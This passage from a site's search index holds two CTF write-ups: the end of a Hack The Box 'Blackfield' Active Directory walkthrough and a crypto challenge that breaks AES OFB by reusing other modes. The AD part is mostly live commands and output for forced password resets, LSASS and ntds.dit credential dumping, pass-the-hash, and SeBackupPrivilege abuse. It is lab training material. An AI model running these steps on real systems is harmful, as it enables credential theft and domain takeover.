Found 316 users INFO: Found 52 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: DC01.BLACKFIELD.local INFO: Done in 02M 06S After collecting the data, we can start the neo4j database and feed the data to BloodHound. I started the analysis from the newly obtained user support and found that the user can change the password of another user audit2020.\n![[Pasted image 20250125143634.png]]\nLet\u0026rsquo;s change the password of user audit2020. I do this using net rpc command to change the password to something easy, like Password123. I then verified if the change is successful using netexec.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/bloodhound] └─$ net rpc password \u0026#39;audit2020\u0026#39; \u0026#39;Password123\u0026#39; -U \u0026#39;BLACKFIELD.local\u0026#39;/\u0026#39;support\u0026#39;%\u0026#39;#00^BlackKnight\u0026#39; -S 10.10.10.192 ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/bloodhound] └─$ netexec smb 10.10.10.192 -u \u0026#39;audit2020\u0026#39; -p \u0026#39;Password123\u0026#39; SMB 10.10.10.192 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\audit2020:Password123 SMB enumeration # Let\u0026rsquo;s check the SMB access of audit2020. Turns out now we have read access to the forensic share.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/bloodhound] └─$ netexec smb 10.10.10.192 -u \u0026#39;audit2020\u0026#39; -p \u0026#39;Password123\u0026#39; --shares SMB 10.10.10.192 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\audit2020:Password123 SMB 10.10.10.192 445 DC01 [*] Enumerated shares SMB 10.10.10.192 445 DC01 Share Permissions Remark SMB 10.10.10.192 445 DC01 ----- ----------- ------ SMB 10.10.10.192 445 DC01 ADMIN$ Remote Admin SMB 10.10.10.192 445 DC01 C$ Default share SMB 10.10.10.192 445 DC01 forensic READ Forensic / Audit share. SMB 10.10.10.192 445 DC01 IPC$ READ Remote IPC SMB 10.10.10.192 445 DC01 NETLOGON READ Logon server share SMB 10.10.10.192 445 DC01 profiles$ READ SMB 10.10.10.192 445 DC01 SYSVOL READ Logon server share I connected to the share with smbclient and found an interesting file lsass.zip, which seems to be a memory dump of the LSASS. However, the file is too large for us to download directly as it returns this error: parallel_read returned NT_STATUS_IO_TIMEOUT.\nsmb: \\memory_analysis\\\u0026gt; get lsass.zip parallel_read returned NT_STATUS_IO_TIMEOUT I found this forum post on how to copy large files over SMB and tried some methods specified here. The method to set longer timeout works for me.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files] └─$ smbclient //10.10.10.192/forensic -U audit2020 Password123 Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; cd memory_analysis smb: \\memory_analysis\\\u0026gt; timeout 600; iosize 16384; io_timeout per operation is now 600 smb: \\memory_analysis\\\u0026gt; get lsass.zip getting file \\memory_analysis\\lsass.zip of size 41936098 as lsass.zip (183.1 KiloBytes/sec) (average 183.1 KiloBytes/sec) smb: \\memory_analysis\\\u0026gt; Unzipping lsass.zip gives lsass.DMP, which indeed is the memory dump of LSASS. We can extract credentials from this file using pypykatz. Found the NT hash for svc_backup: 9658d1d1dcd9250115e2205d9f48400d.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files] └─$ pypykatz lsa minidump ./lsass.DMP ...SNIP... == LogonSession == authentication_id 406499 (633e3) session_id 2 username svc_backup domainname BLACKFIELD logon_server DC01 logon_time 2020-02-23T18:00:03.423728+00:00 sid S-1-5-21-4194615774-2175524697-3563712290-1413 luid 406499 == MSV == Username: svc_backup Domain: BLACKFIELD LM: NA NT: 9658d1d1dcd9250115e2205d9f48400d SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c DPAPI: a03cd8e9d30171f3cfe8caad92fef621 == WDIGEST [633e3]== username svc_backup domainname BLACKFIELD password None password (hex) == Kerberos == Username: svc_backup Domain: BLACKFIELD.LOCAL == WDIGEST [633e3]== username svc_backup domainname BLACKFIELD password None password (hex) == DPAPI [633e3]== luid 406499 key_guid 836e8326-d136-4b9f-94c7-3353c4e45770 masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991 ...SNIP... If we look for svc_backup on our BloodHound, we can see this user is a part of Remote Management and Backup Operators group. This means we can connect to this user using evil-winrm. Obtained the user flag.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files] └─$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; Shell as administrator # Shell enumeration # Remember that this user is a member of the Backup Operators group, which must mean that this user has SeBackupPrivilege. Let\u0026rsquo;s quickly verify it.\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; Since we have SeBackupPrivilege, we can use the privilege escalation technique specified on this post. Basically we have full read access to the system, allowing us to read sensitive files like the SAM file and SYSTEM registry file, which contains the credentials of highly privileged users that we can crack.\nExploiting SeBackupPrivilege # We can use reg save to copy the registry files sam and system, then download them using the download functionality of evil-winrm. Note that downloading the system takes a while.\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; reg save hklm\\sam c:\\sam.reg The operation completed successfully. *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; reg save hklm\\system c:\\system.reg The operation completed successfully. *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; download c:\\sam.reg Info: Downloading c:\\sam.reg to sam.reg Info: Download successful! *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; download c:\\system.reg Info: Downloading c:\\system.reg to system.reg Info: Download successful! *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; After getting them on our local machine, we can use secretsdump.py from Impacket to extract the credentials.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files] └─$ secretsdump.py -sam sam.reg -system system.reg LOCAL Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn\u0026#39;t have hash information. [*] Cleaning up... We successfully extracted the local Administrator\u0026rsquo;s NTLM hash, however there\u0026rsquo;s something missing. I treated this part like a non-domain-joined machine and extracted the local credentials from SAM instead of targeting the domain credentials.\nNow let\u0026rsquo;s start targeting the domain credentials located in the ntds.dit file. I followed the steps specified on the same post as above. Start by creating the file below.\n# chrono.dsh set context persistent nowriters add volume c: alias chrono create expose %chrono% z: ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files] └─$ unix2dos chrono.dsh unix2dos: converting file chrono.dsh to DOS format... After that, I uploaded the chrono.dsh file and created a shadow copy of the C: drive.\n*Evil-WinRM* PS C:\\Temp\u0026gt; upload chrono.dsh ...SNIP... *Evil-WinRM* PS C:\\Temp\u0026gt; diskshadow /s chrono.dsh Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: DC01, 1/25/2025 8:56:27 AM -\u0026gt; set context persistent nowriters -\u0026gt; add volume c: alias chrono -\u0026gt; create Alias chrono for shadow ID {9c8474c6-d67a-401e-a611-2649e7f01c8b} set as environment variable. Alias VSS_SHADOW_SET for shadow set ID {d1f65e75-d98c-4716-9e6a-c820ee4f1306} set as environment variable. Querying all shadow copies with the shadow copy set ID {d1f65e75-d98c-4716-9e6a-c820ee4f1306} * Shadow copy ID = {9c8474c6-d67a-401e-a611-2649e7f01c8b} %chrono% - Shadow copy set: {d1f65e75-d98c-4716-9e6a-c820ee4f1306} %VSS_SHADOW_SET% - Original count of shadow copies = 1 - Original volume name: \\\\?\\Volume{6cd5140b-0000-0000-0000-602200000000}\\ [C:\\] - Creation time: 1/25/2025 8:56:28 AM - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 - Originating machine: DC01.BLACKFIELD.local - Service machine: DC01.BLACKFIELD.local - Not exposed - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5} - Attributes: No_Auto_Release Persistent No_Writers Differential Number of shadow copies listed: 1 -\u0026gt; expose %chrono% z: -\u0026gt; %chrono% = {9c8474c6-d67a-401e-a611-2649e7f01c8b} The shadow copy was successfully exposed as z:\\. -\u0026gt; Now we can copy the ntds file to the current directory and download it.\n*Evil-WinRM* PS C:\\Temp\u0026gt; robocopy /b z:\\windows\\ntds . ntds.dit ...SNIP... *Evil-WinRM* PS C:\\Temp\u0026gt; download ntds.dit I used secretsdump.py again to extract the hashes from ntds.dit. Obtained the domain Administrator\u0026rsquo;s hash.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files] └─$ secretsdump.py -system system.reg -ntds ntds.dit local Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: Successfully gained access over the Administrator, which marks this machine as rooted!\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows/files] └─$ netexec smb 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee SMB 10.10.10.192 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\Administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!) ","date":"25 January 2025","externalUrl":null,"permalink":"/htb/blackfield/","section":"HTB Writeups","summary":"HTB Hard Difficulty Windows Machine. AD.","title":"HTB: Blackfield","type":"htb"},{"content":"","date":"25 January 2025","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":" Challenge Analysis # Challenge file: here\nThe challenge only provides us with chall.py and a connection to server.\nMain Function # The challenge starts by encrypting PASSWORD with AES and a random IV. It uses AES implementation from PyCryptodome, so let\u0026rsquo;s take a look at the docs to see which AES mode is used. Based on the documentation, AES mode 5 is the OFB (Output Feedback) mode. It then prints out the encrypted password along with the IV.\nAfter that, the challenge turns into an encryption and decryption oracle, giving us three chances to do three different types of actions, being:\nEncrypt, where we can encrypt any message using the parameters that we input. Decrypt, where we can decrypt any message using the parameters that we input. Guess, where we can guess the value of PASSWORD, also giving us the flag if we guessed correctly. User Input Function # This function takes in the data to encrypt/decrypt in the form of hex encoding and also the AES parameters in form of JSON. There\u0026rsquo;s a check in this function to ensure that the data length is under 41 bytes, which also means that we can only encrypt 32 bytes max or 2 blocks of AES since AES only accepts increment of 16 bytes.\nCheck Mode Function # This function is the main problem of this challenge. Every encryption and decryption done will check and store the AES mode to used list, so we can\u0026rsquo;t use the same mode twice for the oracle. The challenge here is to decrypt the encrypted password, which spans four blocks, within two actions of encryption and decryption. We can only do two actions since the last one will be used to guess the password.\nDecrypting the Password # Attack Preparation # Let\u0026rsquo;s start by taking a look at the OFB mode encryption. Here we can see that the plaintext is XOR-ed with encrypted IV to get the first ciphertext. The encrypted IV is further encrypted to be XOR-ed with the next ciphertext.\n# Encryption model PASSWORD_BLOCK1 ^ ENC(IV) = CIPHERTEXT_BLOCK1 PASSWORD_BLOCK2 ^ ENC(ENC(IV)) = CIPHERTEXT_BLOCK2 PASSWORD_BLOCK3 ^ ENC(ENC(ENC(IV))) = CIPHERTEXT_BLOCK3 PASSWORD_BLOCK4 ^ ENC(ENC(ENC(ENC(IV)))) = CIPHERTEXT_BLOCK4 Based on the above encryption model, we know that we can recover the password by getting the ENC(IV), ENC(ENC(IV)), ENC(ENC(ENC(IV))), ENC(ENC(ENC(ENC(IV)))), which is just the IV encrypted once - IV encrypted four times with AES. We can encrypt two blocks at once, so we have to find a mode that encrypts the ciphertext of the first block to get the ciphertext of the next block in order to get the IV encrypted twice in one action. If we can find two modes that can do that, we can recover the password in just two actions (four blocks).\nFirst Action: CBC Mode # Take a look at the CBC (Cipher Block Chaining) mode encryption. Here, the resulting ciphertext from block cipher encryption is XOR-ed with the next plaintext, then encrypted again using block cipher encryption.\nIf we set the IV with the IV from the encrypted password then set the plaintext as 32 bytes as null bytes, XOR(plaintext, IV) will result in the IV itself. The IV will then be encrypted to be ENC(IV) as the first block. The encrypted IV is then XOR-ed with more null bytes to still be ENC(IV). It is then encrypted and we get ENC(ENC(IV)) as the second block.\nSecond Action: CFB Mode # For the second action, we\u0026rsquo;ll use the CFB (Cipher Feedback) mode, with the encryption as seen below.\nWhen the IV is set as ENC(ENC(IV)) and the plaintext is 2 blocks of null bytes, the resulting ciphertext will be XOR(ENC(ENC(ENC(IV))), NULL) or ENC(ENC(ENC(IV))) as the first block. This will then be encrypted again and XOR-ed with null bytes to get ENC(ENC(ENC(ENC(IV)))) as the second block.\nPerforming the Attack # Here\u0026rsquo;s a quick refresher on the encryption model.\n# Encryption model PASSWORD_BLOCK1 ^ ENC(IV) = CIPHERTEXT_BLOCK1 PASSWORD_BLOCK2 ^ ENC(ENC(IV)) = CIPHERTEXT_BLOCK2 PASSWORD_BLOCK3 ^ ENC(ENC(ENC(IV))) = CIPHERTEXT_BLOCK3 PASSWORD_BLOCK4 ^ ENC(ENC(ENC(ENC(IV)))) = CIPHERTEXT_BLOCK4 Now that we have gathered all the required blocks of encrypted IV, all we need to do is to XOR them with the encrypted password to get the plaintext PASSWORD, then submit it to get the flag. Let\u0026rsquo;s compile all of it into a Python script and run it.\nfrom pwn import * def repeatingXor(ct, key): print(len(ct), len(key)) res = [ct[i] ^ key[i % len(key)] for i in range(len(ct))] return bytes(res) io = remote(\u0026#34;20.6.89.33\u0026#34;, 8040) # io = process([\u0026#34;python3\u0026#34;, \u0026#34;chall.py\u0026#34;]) io.recvuntil(b\u0026#34;Encrypted password: \u0026#34;) ct = io.recvline().strip().decode() io.recvuntil(b\u0026#34;IV: \u0026#34;) iv = io.recvline().strip().decode() print(\u0026#34;ct:\u0026#34;, ct) print(\u0026#34;iv:\u0026#34;, iv) # CBC mode for the first two blocks io.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) data = b\u0026#34;00\u0026#34; * 32 io.sendlineafter(b\u0026#34;Data: \u0026#34;, data) params = \u0026#39;{\u0026#34;mode\u0026#34;: 2, \u0026#34;iv\u0026#34;: \u0026#34;\u0026#39; + iv + \u0026#39;\u0026#34;}\u0026#39; io.sendlineafter(b\u0026#34;Params: \u0026#34;, params.encode()) io.recvuntil(b\u0026#34;Result: \u0026#34;) first_part = io.recvline().strip().decode() # CFB mode for the last two blocks io.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) data = b\u0026#34;00\u0026#34; * 32 io.sendlineafter(b\u0026#34;Data: \u0026#34;, data) params = \u0026#39;{\u0026#34;mode\u0026#34;: 3, \u0026#34;iv\u0026#34;: \u0026#34;\u0026#39; + first_part[32:] + \u0026#39;\u0026#34;, \u0026#34;segment_size\u0026#34;: 128}\u0026#39; io.sendlineafter(b\u0026#34;Params: \u0026#34;, params.encode()) io.recvuntil(b\u0026#34;Result: \u0026#34;) second_part = io.recvline().strip().decode() fullkey = first_part + second_part password = repeatingXor(bytes.fromhex(ct), bytes.fromhex(fullkey)) print(\u0026#34;Password:\u0026#34;, password) io.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;, b\u0026#34;3\u0026#34;) io.sendlineafter(b\u0026#34;Guess: \u0026#34;, password) io.interactive() ┌──(chronopad㉿VincentXPS)-[~/Documents/ctf2025/CyberJawara_2024/classselect/solve] └─$ python3 solve.py [+] Opening connection to 20.6.89.33 on port 8040: Done ct: 1c2b658a97523abe1a0a2d8805d976618f46b0feb62796374472503a2940319e3529c967b37fd82ad946d3033be3c607be1dcb8374b72081f798232ed665e39d iv: 833cd2ac03e9321e0cf0e8ccf3c798c8 64 64 Password: b\u0026#39;4f8b03e4ffe75f677c7b76d1c6c67a7419f952c4625c97ef55d9aa8c2040470b\u0026#39; [*] Switching to interactive mode Gratz: CJ{deploying_on_dday_is_not_a_good_idea_54aa921ee9486967} [*] Got EOF while reading in interactive $ Flag: CJ{deploying_on_dday_is_not_a_good_idea_54aa921ee9486967}\nResources # https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html https://pycryptodome.readthedocs.io/en/latest/src/cipher/modern.html https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation ","date":"12 January 2025","externalUrl":null,"permalink":"/ctf/cj2024/class_select/","section":"CTF Writeups","summary":"Abusing the encryption of other AES modes to break AES OFB mode.","title":"Cyber Jawara National 2024: Class Select","type":"ctf"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/mode-abuse/","section":"Tags","summary":"","title":"Mode-Abuse","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]